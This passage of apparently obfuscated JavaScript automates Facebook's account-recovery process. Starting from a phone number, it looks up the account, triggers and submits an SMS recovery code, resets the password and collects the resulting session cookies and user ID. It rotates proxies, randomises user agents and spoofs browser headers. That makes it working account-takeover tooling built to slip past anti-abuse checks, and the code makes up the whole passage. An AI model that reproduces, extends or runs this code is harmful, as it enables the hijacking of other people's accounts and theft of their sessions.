  v587.input = v586, v587.scale = 0x1;
  const v588 = v587,
    v589 = buildParams(v580, DOC_SEND, "useCAASendRecoveryCodeMutation", v588, v583, v584, "comet.fbweb.CometCAAARInitiateViewRoute"),
    v590 = v585 || "https://www.facebook.com/login/identify/",
    v591 = await graphqlPost(v589, buildHeaders(v580, v582, "useCAASendRecoveryCodeMutation", v584, v590), 15000, v581, "www.facebook.com");
  dbg("[SEND] HTTP " + v591.status);
  if (v591.status !== 200) return {
    'ok': false,
    'error': "HTTP " + v591.status
  };
  const v592 = parseResp(v591.data),
    v593 = {};
  v593.ok = false, v593.error = "Parse failed";
  if (!v592) return v593;
  if (v592.errors) {
    const v600 = v592.errors[0]?.["message"] || "GraphQL error";
    dbg("[SEND] GRAPHQL ERROR: " + v600 + " | full=" + JSON.stringify(v592.errors[0]));
    const v601 = {};
    return v601.ok = false, v601.error = v600, v601;
  }
  const v594 = v592?.["data"]?.["caa_ar_fb_send_confirmation_code"];
  dbg("[SEND] result=" + JSON.stringify(v594));
  const v595 = {};
  v595.ok = false;
  v595.error = "no result in send response";
  if (!v594) return v595;
  const v596 = {};
  v596.ok = false, v596.error = "captcha";
  if (v594.captcha_persist_data) return v596;
  const v597 = v591.headers && v591.headers["set-cookie"];
  if (v597) {
    const v602 = {};
    (v580.cookieHeader || '').split(';').forEach(v604 => {
      const v605 = v604.indexOf('=');
      if (v605 < 0) return;
      v602[v604.slice(0, v605).trim()] = v604.slice(v605 + 1).trim();
    });
    const v603 = Array.isArray(v597) ? v597 : [v597];
    v603.forEach(v606 => {
      const v607 = v606.split(';')[0].split('=');
      if (v607.length >= 2) v602[v607[0].trim()] = v607.slice(1).join('=').trim();
    }), v580.cookieHeader = Object.entries(v602).map(([v608, v609]) => v608 + '=' + v609).join(';\x20'), dbg("[SEND] Merged " + v603.length + " cookie(s) into session from sendOTP response");
  }
  let v598 = null;
  if (v594.redirect_uri) {
    const v610 = v594.redirect_uri.match(/[?&]ci=([A-Za-z0-9_\-]+)/);
    if (v610) v598 = v610[1];
    dbg("[SEND] redirect_uri=" + v594.redirect_uri + " → sendCipher=" + (v598 ? "..." + v598.slice(-8) : "NULL"));
    try {
      const v611 = v594.redirect_uri.startsWith("http") ? (() => {
        try {
          {
            const v626 = new URL(v594.redirect_uri);
            return v626.pathname + v626.search;
          }
        } catch (v627) {
          return v594.redirect_uri;
        }
      })() : v594.redirect_uri;
      dbg("[SEND] GET code page (via " + (v581 ? "proxy" : "direct") + "): " + v611);
      const v612 = await httpsGetPageWithRedirects(v611, v580.cookieHeader, 15000, "www.facebook.com", v581, v582, "https://www.facebook.com/login/identify/");
      if (v612.cookieHeader) v580.cookieHeader = v612.cookieHeader;
      const v613 = v612.headers && v612.headers["set-cookie"];
      if (v613) {
        {
          const v628 = {};
          (v580.cookieHeader || '').split(';').forEach(v630 => {
            {
              const v631 = v630.indexOf('=');
              if (v631 < 0) return;
              v628[v630.slice(0, v631).trim()] = v630.slice(v631 + 1).trim();
            }
          });
          const v629 = Array.isArray(v613) ? v613 : [v613];
          v629.forEach(v632 => {
            const v633 = v632.split(';')[0].split('=');
            if (v633.length >= 2) {
              const v634 = v633[0].trim(),
                v635 = v633.slice(1).join('=').trim();
              if (v635 !== "deleted" && !v635.startsWith("deleted;")) v628[v634] = v635;
            }
          }), v580.cookieHeader = Object.entries(v628).map(([v636, v637]) => v636 + '=' + v637).join(';\x20'), dbg("[SEND] Code page merged. sfiu=" + (v628.sfiu ? "✓ len=" + v628.sfiu.length : '✗') + " keys=" + Object.keys(v628).join(','));
        }
      } else dbg("[SEND] Code page: NO set-cookie in response (status=" + v612.status + ')');
      const v614 = v612.data || '',
        v615 = v614.match(/"LSD",\[\],\{"token":"([^"]+)"/)?.[1];
      if (v615 && v615 !== v580.lsd) {
        {
          v580.lsd = v615;
          let v638 = 0;
          for (let v639 = 0; v639 < v615.length; v639++) v638 += v615.charCodeAt(v639);
          v580.jazoest = '2' + v638, dbg("[SEND] Updated lsd+jazoest from code page");
        }
      }
      const v616 = v614.match(/"__s"\s*:\s*"([a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+)"/);
      if (v616 && v616[1]) {
        v580.__s_code = v616[1], v580.__s = v616[1], dbg("[SEND] Extracted __s: " + v580.__s_code);
      }
      const v617 = v614.match(/"haste_session"\s*:\s*"([^"]+)"/) || v614.match(/"__hs"\s*:\s*"([^"]+)"/);
      v617 && v617[1] && (v580.__hs = v617[1], dbg("[SEND] Extracted __hs: " + v580.__hs));
      const v618 = v614.match(/"__dyn"\s*:\s*"([^"]+)"/);
      v618 && v618[1] && (v580.__dyn_code = v618[1], v580.__dyn = v618[1]);
      const v619 = v614.match(/"__csr"\s*:\s*"([^"]+)"/);
      if (v619 && v619[1]) {
        v580.__csr_code = v619[1], v580.__csr = v619[1];
      }
      const fn12 = v640 => v640 && !v640.startsWith(':') && !/^[\d,]+$/.test(v640) && v640.length > 10,
        v620 = v614.match(/"__hsdp"\s*:\s*"([^"]+)"/);
      v620 && fn12(v620[1]) && (v580.__hsdp_code = v620[1], dbg("[SEND] __hsdp_code from code page (encoded)"));
      const v621 = v614.match(/"__hblp"\s*:\s*"([^"]+)"/);
      v621 && fn12(v621[1]) && (v580.__hblp_code = v621[1], dbg("[SEND] __hblp_code from code page (encoded)"));
      const v622 = v614.match(/"__sjsp"\s*:\s*"([^"]+)"/);
      if (v622 && fn12(v622[1])) {
        v580.__sjsp_code = v622[1], dbg("[SEND] __sjsp_code from code page (encoded)");
      }
      dbg("[SEND] After code page: hsdp_code=" + (v580.__hsdp_code ? "OK(" + v580.__hsdp_code.length + ')' : "MISS") + " hblp_code=" + (v580.__hblp_code ? 'OK' : "MISS") + " sjsp_code=" + (v580.__sjsp_code ? 'OK' : "MISS"));
      const v623 = v614.match(/"__rev"\s*:\s*(\d+)/);
      v623 && v623[1] && (v580.rev = v623[1]);
      const v624 = v614.match(/"__spin_t"\s*:\s*(\d+)/);
      v624 && v624[1] && (v580.spinT = v624[1]);
      const v625 = v614.match(/"__hsi"\s*:\s*"?(\d+)"?/);
      if (v625 && v625[1]) {
        v580.hsi = v625[1];
      }
    } catch (v641) {
      dbg("[SEND] Code page GET error: " + v641.message);
    }
  }
  if (v594.redirect_uri || v594.status === "success" || v594.is_success === true || v594.sent === true) {
    const v642 = {};
    return v642.ok = true, v642.sendCipher = v598, v642;
  }
  const v599 = {};
  return v599.ok = false, v599.error = v594.error_message || v594.status || "unknown", v599;
}
async function confirmOTP(v643, v644, v645, v646, v647, v648, v649, v650) {
  const v651 = String(v644).trim().padStart(6, '0'),
    v652 = {};
  v652.sensitive_string_value = v651;
  const v653 = {};
  v653.actor_id = '0';
  v653.client_mutation_id = '3', v653.access_flow_version = "pre_mt_behavior", v653.cipher = v643, v653.nonce = v652;
  const v654 = {};
  v654.input = v653, v654.scale = 0x1;
  const v655 = v654,
    v656 = buildParams(v645, DOC_CONFIRM, "useCAACodeSubmittedMutation", v655, v648, v649, "comet.fbweb.CometCAAARCodeEntryRoute");
  v656["delete"]("fb_dtsg");
  const v657 = "https://www.facebook.com/recover/code/?ci=" + encodeURIComponent(v643),
    v658 = v650 || v657,
    v659 = {
      ...buildHeaders(v645, v647, "useCAACodeSubmittedMutation", v649, v658),
      'x-fb-upl-sessionid': "upl_" + Date.now() + '_' + uuid(),
      'x-bh-flowsessionid': "upl_wizard_" + Date.now() + '_' + uuid()
    },
    v660 = (v659.Cookie || '').split(';').map(v675 => v675.trim().split('=')[0]).filter(Boolean);
  cdbg("[CONFIRM OTP] COOKIE KEYS: " + v660.join(',\x20') + " | sfiu=" + (v660.includes("sfiu") ? "PRESENT ✓" : "MISSING ✗ — WILL FAIL")), cdbg("[CONFIRM OTP] OTP_SUBMITTED: \"" + v651 + "\" (raw=\"" + v644 + "\") | CIPHER_END: ..." + v643.slice(-12)), cdbg("[CONFIRM OTP] SESSION: hsdp=" + (v645.__hsdp ? "OK(" + v645.__hsdp.length + ')' : "MISS") + " hblp=" + (v645.__hblp ? 'OK' : "MISS") + " sjsp=" + (v645.__sjsp ? 'OK' : "MISS") + " __s=" + (v645.__s || "EMPTY") + " dyn=" + (v645.__dyn ? "LIVE" : "FALLBACK") + " fb_dtsg=" + (v645.fb_dtsg ? "STRIPPED" : "none")), cdbg("[CONFIRM OTP] REQUEST BODY (first 2500): " + v656.toString().slice(0, 2500));
  const v661 = await graphqlPost(v656, v659, 20000, v646, "www.facebook.com");
  cdbg("[CONFIRM OTP] HTTP " + v661.status);
  if (v661.status !== 200) return {
    'ok': false,
    'error': "HTTP " + v661.status
  };
  const v662 = parseResp(v661.data);
  cdbg("[CONFIRM OTP] RAW BODY (first 1200): " + String(v661.data || '').slice(0, 1200)), cdbg("[CONFIRM OTP] PARSED DATA: " + JSON.stringify(v662?.["data"] || v662?.["errors"] || "null"));
  const v663 = {};
  v663.ok = false, v663.error = "Parse failed";
  if (!v662) return v663;
  if (v662.errors) {
    {
      const v676 = v662.errors[0]?.["message"] || "OTP error";
      cdbg("[CONFIRM OTP] GraphQL Error: " + v676);
      const v677 = {};
      return v677.ok = false, v677.error = v676, v677;
    }
  }
  const v664 = v662?.["data"]?.["caa_ar_code_entry_submit"] || v662?.["data"]?.["caa_ar_fb_code_submitted"] || null;
  cdbg("[CONFIRM OTP] submitResult=" + JSON.stringify(v664));
  const v665 = {};
  v665.ok = false, v665.error = "No submit result in response";
  if (!v664) return v665;
  const v666 = v664.redirect_uri || '';
  if (!v666) {
    {
      const v678 = v664.error_message,
        v679 = v678 && typeof v678 === "object" ? v678.text || JSON.stringify(v678) : v678 || '',
        v680 = v664.error_style === "PAGE_LEVEL_BANNER" || v664.error_style === "BANNER",
        v681 = v679 || "OTP wrong or expired (empty redirect_uri)";
      cdbg("[CONFIRM OTP] OTP REJECTED (flagged=" + v680 + "): " + v681);
      const v682 = {};
      return v682.ok = false, v682.error = v681, v682.flagged = v680, v682;
    }
  }
  const v667 = decodeURIComponent(v666);
  let v668 = null;
  const v669 = v667.match(/[?&]ci=([A-Za-z0-9_\-]+)/);
  if (v669) v668 = v669[1];
  cdbg("[CONFIRM OTP] resetCipher=" + (v668 ? "..." + v668.slice(-8) : "NULL"));
  if (!v668 && v666.includes("/two_step_verification/")) {
    cdbg("[CONFIRM OTP] OTP REJECTED: 2FA required (" + v666 + ')');
    const v683 = {};
    return v683.ok = false, v683.error = "2FA verification required", v683;
  }
  if (!v668 && v666.includes("/checkpoint/") && !v667.includes("/recover/password/")) {
    {
      cdbg("[CONFIRM OTP] OTP REJECTED: Checkpoint required (" + v666 + ')');
      const v684 = {};
      return v684.ok = false, v684.error = "Account in Checkpoint", v684;
    }
  }
  cdbg("[CONFIRM OTP] OTP ACCEPTED, redirect_uri=" + v666);
  const v670 = {};
  if (v645.cookieHeader) {
    v645.cookieHeader.split(';').forEach(v685 => {
      const v686 = v685.indexOf('=');
      if (v686 < 0) return;
      const v687 = v685.slice(0, v686).trim(),
        v688 = v685.slice(v686 + 1).trim();
      if (v688 && v688 !== "deleted" && !v688.startsWith("deleted;")) v670[v687] = v688;
    });
  }
  try {
    {
      const v689 = v668 ? "/recover/password/?ci=" + v668 : v666.startsWith("http") ? (() => {
        try {
          const v693 = new URL(v666);
          return v693.pathname + v693.search;
        } catch (v694) {
          return v666;
        }
      })() : v666;
      cdbg("[CONFIRM OTP] Following redirect GET: " + v689);
      const v690 = await httpsGetPage(v689, v645.cookieHeader, 15000, "www.facebook.com", v646, v647);
      cdbg("[CONFIRM OTP] Follow redirect HTTP " + v690.status);
      const v691 = v690.headers || {},
        v692 = v691["set-cookie"];
      if (v692) {
        const v695 = Array.isArray(v692) ? v692 : [v692];
        v695.forEach(v696 => {
          {
            const v697 = v696.split(';')[0].split('=');
            if (v697.length >= 2) v670[v697[0].trim()] = v697.slice(1).join('=').trim();
          }
        });
      }
      cdbg("[CONFIRM OTP] Follow redirect cookies: " + JSON.stringify(v670));
      if ((!v670.c_user || v670.c_user === '0') && (!v645.accountUid || v645.accountUid === '0')) {
        {
          const v698 = v690.data || '',
            v699 = v698.match(/"c_user"\s*,\s*\[\s*\]\s*,\s*\{"token"\s*:\s*"(\d+)"/),
            v700 = v698.match(/"USER_ID"\s*:\s*"(\d+)"/),
            v701 = v698.match(/"userID"\s*:\s*"(\d+)"/);
          if (v699) v670.c_user = v699[1];else {
            if (v700) v670.c_user = v700[1];else {
              if (v701) v670.c_user = v701[1];
            }
          }
          cdbg("[CONFIRM OTP] Body uid scan: c_user=" + (v670.c_user || "NULL"));
        }
      } else v645.accountUid && v645.accountUid !== '0' && (v670.c_user = String(v645.accountUid), cdbg("[CONFIRM OTP] Using stored session UID: " + v645.accountUid));
    }
  } catch (v702) {
    cdbg("[CONFIRM OTP] Follow redirect error: " + v702.message);
  }
  const v671 = v661.headers && v661.headers["set-cookie"];
  if (v671) {
    const v703 = Array.isArray(v671) ? v671 : [v671];
    v703.forEach(v704 => {
      const v705 = v704.split(';')[0].split('=');
      if (v705.length >= 2 && !v670[v705[0].trim()]) v670[v705[0].trim()] = v705.slice(1).join('=').trim();
    });
  }
  const fn13 = v706 => v706 && !v706.startsWith("17848") && !v706.startsWith("17849") && !(Number(v706) >= 1700000000 && Number(v706) <= 2000000000),
    fn14 = v707 => v707 && v707 !== '0' && v707 !== "deleted" && fn13(String(v707)) && /^\d{8,16}$/.test(String(v707));
  let v672 = null;
  if (v670 && v670.checkpoint) try {
    const v708 = JSON.parse(decodeURIComponent(v670.checkpoint));
    v708 && fn14(v708.u) && (v672 = String(v708.u), cdbg("[CONFIRM OTP] Extracted real UID from checkpoint payload: " + v672));
  } catch (v709) {}
  if (!v672 && v645.accountUid && fn14(v645.accountUid)) {
    v672 = String(v645.accountUid), cdbg("[CONFIRM OTP] Using stored session UID: " + v672);
  }
  if (!v672 && v670.c_user && fn14(v670.c_user)) {
    v672 = String(v670.c_user), cdbg("[CONFIRM OTP] Using c_user cookie UID: " + v672);
  }
  v672 && fn14(v672) ? v670.c_user = v672 : cdbg("[CONFIRM OTP] Warning: Real numeric UID not resolved yet (raw c_user=" + (v670.c_user || "null") + ')');
  cdbg("[CONFIRM OTP] final uid=" + v672 + " | allCookies=" + JSON.stringify(v670));
  if (v670.checkpoint) return {
    'ok': false,
    'error': "Account in Checkpoint"
  };
  const v673 = {};
  (v645.cookieHeader || '').split(';').forEach(v710 => {
    {
      const v711 = v710.indexOf('=');
      if (v711 < 0) return;
      v673[v710.slice(0, v711).trim()] = v710.slice(v711 + 1).trim();
    }
  }), Object.entries(v670).forEach(([v712, v713]) => {
    v673[v712] = v713;
  }), v645.cookieHeader = Object.entries(v673).map(([v714, v715]) => v714 + '=' + v715).join(';\x20');
  cdbg("[CONFIRM OTP] uid=" + v672 + " resetCipher=" + (v668 ? "..." + v668.slice(-8) : "NULL"));
  const v674 = {};
  return v674.ok = true, v674.uid = v672, v674.cookieMap = v670, v674.resetCipher = v668, v674;
}
async function resetPassword(v716, v717, v718, v719, v720, v721, v722, v723, v724) {
  const v725 = "#PWD_BROWSER:0:0:" + v717,
    v726 = {};
  v726.sensitive_string_value = v725;
  const v727 = {
      'input': {
        'actor_id': v718,
        'client_mutation_id': uuid(),
        'access_flow_version': "pre_mt_behavior",
        'cipher': v716,
        'pwd': v726,
        'should_skip': false,
        'stay_logged_in_on_other_devices': true
      },
      'scale': 0x1
    },
    v728 = buildParams(v719, DOC_RESET_PWD, "useCAAResetPasswordMutation", v727, v722, v723, "comet.fbweb.CometCAAARResetPasswordRoute"),
    v729 = v728.toString().replace(/(?<=^|&)av=0(?=&|$)/, "av=" + v718).replace(/(?<=^|&)__user=0(?=&|$)/, "__user=" + v718),
    v730 = v724 || "https://www.facebook.com/recover/password/?ci=" + v716,
    v731 = {
      ...buildHeaders(v719, v721, "useCAAResetPasswordMutation", v723, v730),
      'x-fb-lsd': v719.lsd
    };
  if (v719.fb_dtsg) v731["x-fb-dtsg"] = v719.fb_dtsg;
  const v732 = await graphqlPost(v729, v731, 20000, v720, "www.facebook.com");
  dbg("[RESET PWD] HTTP " + v732.status);
  if (v732.status !== 200) return {
    'ok': false,
    'error': "HTTP " + v732.status
  };
  const v733 = parseResp(v732.data);
  const v734 = {};
  v734.ok = false, v734.error = "Parse failed";
  if (!v733) return v734;
  if (v733.error || v733.errorSummary || v733.errorDescription) {
    {
      const v741 = v733.errorSummary || v733.errorDescription || "Error " + v733.error;
      dbg("[RESET PWD] REJECTED BY FB: " + v741);
      const v742 = {};
      return v742.ok = false, v742.error = v741, v742;
    }
  }
  if (v733.errors && v733.errors.length > 0) {
    const v743 = v733.errors[0]?.["message"] || "Password reset error";
    dbg("[RESET PWD] GraphQL Error: " + v743);
    const v744 = {};
    return v744.ok = false, v744.error = v743, v744;
  }
  const v735 = v733.data?.["caa_ar_reset_password_submit"] || v733.data?.["reset_password"];
  if (v735 && v735.error_message) {
    {
      dbg("[RESET PWD] Mutation error: " + v735.error_message);
      const v745 = {};
      return v745.ok = false, v745.error = v735.error_message, v745;
    }
  }
  const v736 = {};
  const v737 = v732.headers && v732.headers["set-cookie"];
  v737 && (Array.isArray(v737) ? v737 : [v737]).forEach(v746 => {
    const v747 = v746.split(';')[0].split('=');
    if (v747.length >= 2) {
      {
        const v748 = v747[0].trim(),
          v749 = v747.slice(1).join('=').trim();
        v749 !== "deleted" && !v749.startsWith("deleted;") && (v736[v748] = v749);
      }
    }
  });
  const v738 = v736.c_user,
    fn15 = v750 => v750 && v750 !== '0' && v750 !== "deleted" && !v750.startsWith("17848") && !v750.startsWith("17849") && /^\d{8,16}$/.test(String(v750)),
    v739 = fn15(v738) ? String(v738) : fn15(v718) ? String(v718) : null;
  dbg("[RESET PWD] SUCCESS parsed=" + JSON.stringify(v733) + " finalUid=" + v739);
  const v740 = {};
  return v740.ok = true, v740.newCookies = v736, v740.finalUid = v739, v740;
}
async function processConfirm(v751, v752, v753, v754 = 0) {
  const v755 = v751.startsWith('+') ? v751 : '+' + v751;
  let v756 = null,
    v757 = -1;
  proxyManager.hasProxies && (v756 = proxyManager.getNext(v755), v757 = proxyManager.index - 1);
  const v758 = getRandomUserAgent();
  const v759 = getPhoneLang(v755),
    v760 = resolveTimezone(v756, v755),
    v761 = {
      'host': "www.facebook.com",
      'locale': v759.split(',')[0].replace('-', '_'),
      'lang': v759
    };
  let v762;
  try {
    {
      try {
        v762 = await withHardTimeout(seedSession(v756, v758, v761), 25000, "seedSession");
      } catch (v763) {
        dbg("[CONFIRM] seedSession with proxy failed (" + v763.message + "), retrying DIRECT..."), v762 = await withHardTimeout(seedSession(null, v758, v761), 30000, "seedSession-direct");
      }
      if (!v762.fb_dtsg) {
        try {
          const v764 = {};
          v764.host = "www.facebook.com", v764.locale = v761.locale, v764.lang = v759;
          const v765 = v764,
            v766 = await withHardTimeout(seedSession(v756 || null, v758, v765), 20000, "seedSession-retry");
          if (v766.fb_dtsg) v762 = v766;
        } catch (v767) {}
      }
    }
  } catch (v768) {
    return {
      'result': "error",
      'msg': "Session failed: " + v768.message,
      'ua': v758,
      'proxy': v756
    };
  }
  try {
    const v769 = v762.initialCipher ? "https://www.facebook.com/login/identify/?ci=" + v762.initialCipher : "https://www.facebook.com/login/identify/",
      v770 = await withHardTimeout(searchAccount(v755, v762, v756, v758, v760, v759, v769), 60000, "searchAccount");
    if (!v770.ok) return {
      'result': v770.result || "error",
      'msg': "Search failed",
      'ua': v758,
      'proxy': v756
    };
    let {
      wfId: v771,
      evId: v772,
      searchCipher: v773
    } = v770;
    const fn16 = v794 => v794 && v794 !== '0' && v794 !== "deleted" && !String(v794).startsWith("17848") && !String(v794).startsWith("17849") && /^\d{8,16}$/.test(String(v794));
    if (v770.accounts && v770.accounts.length > 0) {
      for (const v795 of v770.accounts) {
        const v796 = v795.id || v795.uid || v795.fbid || v795.account_id || v795.user_id || v795.profile_id;
        if (fn16(v796)) {
          {
            v762.accountUid = String(v796), cdbg("[SEARCH] Found UID in account search object: " + v762.accountUid);
            break;
          }
        }
        if (v795.cuid) {
          try {
            const v797 = Buffer.from(v795.cuid, "base64url").toString("utf8"),
              v798 = v797.match(/\b(615\d{11,13}|1000\d{10,12}|\d{10,16})\b/);
            if (v798 && fn16(v798[1])) {
              {
                v762.accountUid = v798[1], cdbg("[SEARCH] Extracted UID from decoded cuid: " + v762.accountUid);
                break;
              }
            }
          } catch (v799) {}
        }
      }
    }
    let v774 = v773;
    if (v770.accounts && v770.accounts.length > 0) {
      const v800 = await withHardTimeout(selectAccount(v770.accounts[0], v773, 0, v762, v756, v758, v760, v759, v769), 30000, "selectAccount"),
        v801 = {};
      v801.result = "error", v801.msg = "Select failed", v801.ua = v758, v801.proxy = v756;
      if (!v800.ok) return v801;
      if (v800.selectCipher) v774 = v800.selectCipher;
      v800.accountUid && fn16(v800.accountUid) && (v762.accountUid = String(v800.accountUid));
    }
    const v775 = await withHardTimeout(getInitiateView(v774, v762, v756, v758, v760, v759, v769), 30000, "getInitiateView");
    if (!v775.ok) return {
      'result': "no_sms",
      'msg': v775.error,
      'ua': v758,
      'proxy': v756
    };
    v775.accountUid && fn16(v775.accountUid) && (v762.accountUid = String(v775.accountUid));
    const v776 = await withHardTimeout(sendOTP(v771, v772, v775.cipher, v775.recoverMethod, v762, v756, v758, v760, v759, v769), 60000, "sendOTP");
    if (!v776.ok) return {
      'result': "error",
      'msg': "Send OTP failed: " + v776.error,
      'ua': v758,
      'proxy': v756
    };
    const v777 = v776.sendCipher || v775.cipher;
    cdbg("[CONFIRM] sendOTP OK. urlCipher=..." + v777.slice(-8));
    let v778 = v777;
    try {
      {
        const v802 = "/recover/code/?ci=" + encodeURIComponent(v777);
        cdbg("[CONFIRM] Navigation POST for code page cipher: " + v802.slice(0, 80));
        const v803 = new URLSearchParams();
        v803.set("client_previous_actor_id", ''), v803.set("route_url", "/recover/code/?ci=" + v777), v803.set("routing_namespace", "fb_comet"), v803.set("trace_policy", "comet.caa.account_recovery.account_search"), v803.set("__aaid", '0'), v803.set("__user", '0'), v803.set("__a", '1');
        if (!v762.__req) v762.__req = 10;
        v803.set("__req", (v762.__req++).toString(16)), v803.set("__hs", v762.__hs || ''), v803.set("dpr", '1'), v803.set("__ccg", "EXCELLENT"), v803.set("__rev", v762.rev || ''), v803.set("__s", v762.__s || ''), v803.set("__hsi", v762.hsi || ''), v803.set("__dyn", v762.__dyn || ''), v803.set("__csr", v762.__csr || '');
        if (v762.__hsdp) v803.set("__hsdp", v762.__hsdp);
        if (v762.__hblp) v803.set("__hblp", v762.__hblp);
        if (v762.__sjsp) v803.set("__sjsp", v762.__sjsp);
        v803.set("__comet_req", '15'), v803.set("lsd", v762.lsd || ''), v803.set("jazoest", v762.jazoest || ''), v803.set("__spin_r", v762.rev || ''), v803.set("__spin_b", "trunk"), v803.set("__spin_t", v762.spinT || ''), v803.set("__crn", "comet.fbweb.CometCAAARCodeEntryRoute"), v803.set("qpl_active_flow_ids", "516759801");
        const v804 = v803.toString(),
          v805 = "https://www.facebook.com/login/identify/?ci=" + v777,
          v806 = {
            'Content-Type': "application/x-www-form-urlencoded",
            'Content-Length': Buffer.byteLength(v804),
            'Cookie': v762.cookieHeader,
            'User-Agent': v758.userAgent,
            'Accept': "*/*",
            'Accept-Language': v759,
            'Accept-Encoding': "gzip, deflate, br",
            'Referer': v805,
            'Origin': "https://www.facebook.com",
            'X-FB-LSD': v762.lsd || '',
            'X-ASBD-ID': "359341",
            'X-FB-QPL-Active-Flows': "516759801",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            ...v758.clientHints
          };
        let v807;
        v756 ? v807 = await proxyHttpsRequest(v756, {
          'hostname': "www.facebook.com",
          'path': "/ajax/navigation/",
          'method': "POST",
          'headers': v806
        }, v804, 15000) : v807 = await new Promise((v823, v824) => {
          const v825 = {};
          v825.hostname = "www.facebook.com", v825.port = 0x1bb;
          v825.path = "/ajax/navigation/", v825.method = "POST";
          v825.timeout = 0x3a98, v825.headers = v806;
          const v826 = v825;
          const v827 = https.request(v826, v828 => {
            const v829 = [];
            v828.on("data", v830 => v829.push(v830));
            v828.on("end", () => {
              let v831 = Buffer.concat(v829);
              try {
                const v832 = v828.headers["content-encoding"];
                if (v832 === "gzip") v831 = zlib.gunzipSync(v831);else {
                  if (v832 === "deflate") v831 = zlib.inflateSync(v831);else {
                    if (v832 === 'br') v831 = zlib.brotliDecompressSync(v831);
                  }
                }
              } catch (v833) {}
              v823({
                'status': v828.statusCode,
                'headers': v828.headers,
                'data': v831.toString(),
                'location': v828.headers.location || ''
              });
            }), v828.on("error", v824);
          });
          v827.on("error", v824), v827.on("timeout", () => {
            v827.destroy(), v824(new Error("timeout"));
          }), v827.write(v804), v827.end();
        });
        cdbg("[CONFIRM] Navigation HTTP " + v807.status + " loc=" + (v807.location || '').slice(0, 80));
        const v808 = v807.data || '';
        cdbg("[CONFIRM] Navigation body (first 600): " + v808.slice(0, 600));
        const v809 = v807.headers && v807.headers["set-cookie"];
        if (v809) {
          {
            const v834 = {};
            (v762.cookieHeader || '').split(';').forEach(v836 => {
              {
                const v837 = v836.indexOf('=');
                if (v837 < 0) return;
                v834[v836.slice(0, v837).trim()] = v836.slice(v837 + 1).trim();
              }
            }), (Array.isArray(v809) ? v809 : [v809]).forEach(v838 => {
              const v839 = v838.split(';')[0].split('=');
              if (v839.length >= 2) {
                const v840 = v839[0].trim(),
                  v841 = v839.slice(1).join('=').trim();
                if (v841 !== "deleted") v834[v840] = v841;
              }
            }), v762.cookieHeader = Object.entries(v834).map(([v842, v843]) => v842 + '=' + v843).join(';\x20');
            const v835 = {};
            (v762.cookieHeader || '').split(';').forEach(v844 => {
              const v845 = v844.indexOf('=');
              if (v845 < 0) return;
              v835[v844.slice(0, v845).trim()] = v844.slice(v845 + 1).trim();
            }), cdbg("[CONFIRM] Navigation cookies. sfiu=" + (v835.sfiu ? '✓' : '✗') + " keys=" + Object.keys(v835).join(','));
          }
        }
        const v810 = /"(?:cipher|ci)"\s*:\s*"([A-Za-z0-9_\-]{80,})"/g;
        let v811;
        while ((v811 = v810.exec(v808)) !== null) {
          if (v811[1] && v811[1] !== v777) {
            {
              v778 = v811[1], cdbg("[CONFIRM] Extracted formCipher from navigation JSON: ..." + v778.slice(-8));
              break;
            }
          }
        }
        if (v778 === v777) {
          {
            const v846 = v808.match(/[?&]ci=([A-Za-z0-9_\-]{80,})(?=["&\s\\]|$)/);
            v846 && v846[1] && v846[1] !== v777 ? (v778 = v846[1], cdbg("[CONFIRM] Extracted formCipher from ci= param: ..." + v778.slice(-8))) : cdbg("[CONFIRM] formCipher == urlCipher (navigation did not return different cipher — checking code HTML GET)");
          }
        }
        const v812 = v808.match(/"LSD",\[\],\{"token":"([^"]+)"/)?.[1];
        if (v812 && v812 !== v762.lsd) {
          {
            v762.lsd = v812;
            let v847 = 0;
            for (let v848 = 0; v848 < v812.length; v848++) v847 += v812.charCodeAt(v848);
            v762.jazoest = '2' + v847, cdbg("[CONFIRM] Updated lsd from code page HTML");
          }
        }
        const v813 = v808.match(/"__s"\s*:\s*"([a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+)"/);
        if (v813 && v813[1]) v762.__s = v813[1], cdbg("[CONFIRM] Extracted __s from code page: " + v762.__s);else {
          if (!v762.__s) {
            {
              const fn20 = (v849 = 6) => {
                const v850 = "abcdefghijklmnopqrstuvwxyz0123456789";
                let v851 = '';
                for (let v852 = 0; v852 < v849; v852++) v851 += v850[Math.floor(Math.random() * v850.length)];
                return v851;
              };
              v762.__s = fn20() + ':' + fn20() + ':' + fn20(), cdbg("[CONFIRM] Generated random __s (not in HTML): " + v762.__s);
            }
          }
        }
        const v814 = v808.match(/"haste_session"\s*:\s*"([^"]+)"/) || v808.match(/"__hs"\s*:\s*"([^"]+)"/);
        if (v814 && v814[1]) {
          v762.__hs = v814[1], cdbg("[CONFIRM] Extracted __hs from code page: " + v762.__hs);
        }
        const v815 = v808.match(/"__dyn"\s*:\s*"([^"]+)"/);
        v815 && v815[1] && (v762.__dyn = v815[1]);
        const v816 = v808.match(/"__csr"\s*:\s*"([^"]+)"/);
        v816 && v816[1] && (v762.__csr = v816[1]);
        const v817 = v808.match(/"__rev"\s*:\s*(\d+)/);
        v817 && v817[1] && (v762.rev = v817[1]);
        const v818 = v808.match(/"__spin_t"\s*:\s*(\d+)/);
        if (v818 && v818[1]) {
          v762.spinT = v818[1];
        }
        const v819 = v808.match(/"__hsi"\s*:\s*"?(\d+)"?/);
        if (v819 && v819[1]) {
          v762.hsi = v819[1];
        }
        const fn19 = v853 => v853 && !v853.startsWith(':') && !/^[\d,]+$/.test(v853) && v853.length > 10,
          v820 = v808.match(/"__hsdp"\s*:\s*"([^"]+)"/);
        if (v820 && fn19(v820[1])) v762.__hsdp = v820[1], cdbg("[CONFIRM] Got __hsdp from navigation (encoded, len=" + v820[1].length + ')');else {
          if (!v762.__hsdp) {
            cdbg("[CONFIRM] __hsdp: navigation had none/raw, identify page also had none");
          } else cdbg("[CONFIRM] __hsdp: keeping prior value (len=" + v762.__hsdp.length + "), navigation had none/raw");
        }
        const v821 = v808.match(/"__hblp"\s*:\s*"([^"]+)"/);
        if (v821 && fn19(v821[1])) v762.__hblp = v821[1], cdbg("[CONFIRM] Got __hblp from navigation (encoded)");else !v762.__hblp && cdbg("[CONFIRM] __hblp: no encoded value from navigation");
        const v822 = v808.match(/"__sjsp"\s*:\s*"([^"]+)"/);
        if (v822 && fn19(v822[1])) {
          v762.__sjsp = v822[1], cdbg("[CONFIRM] Got __sjsp from navigation (encoded)");
